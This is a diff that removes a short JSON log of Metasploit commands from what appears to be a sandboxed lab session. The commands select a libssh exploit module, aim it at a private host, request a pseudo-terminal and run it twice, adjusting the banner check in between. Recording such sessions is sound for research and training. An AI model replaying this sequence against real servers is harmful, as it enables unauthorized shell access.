@@ -1,9 +1,0 @@
-{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:08:51.162200Z", "cmd_type": "msf-command", "cmd": "search libssh"}
-{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:08:52.715609Z", "cmd_type": "msf-command", "cmd": "use 0"}
-{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:08:55.182840Z", "cmd_type": "msf-command", "cmd": "show options"}
-{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:09:15.906353Z", "cmd_type": "msf-command", "cmd": "set rhosts 172.18.1.5"}
-{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:09:30.585179Z", "cmd_type": "msf-command", "cmd": "set spawn_pty true"}
-{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:09:32.470588Z", "cmd_type": "msf-command", "cmd": "run"}
-{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:09:53.877639Z", "cmd_type": "msf-command", "cmd": "show options"}
-{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:10:46.515962Z", "cmd_type": "msf-command", "cmd": "set check_banner false"}
-{"sandbox_id": "396", "timestamp_str": "2019-08-14T16:10:48.359468Z", "cmd_type": "msf-command", "cmd": "run"}
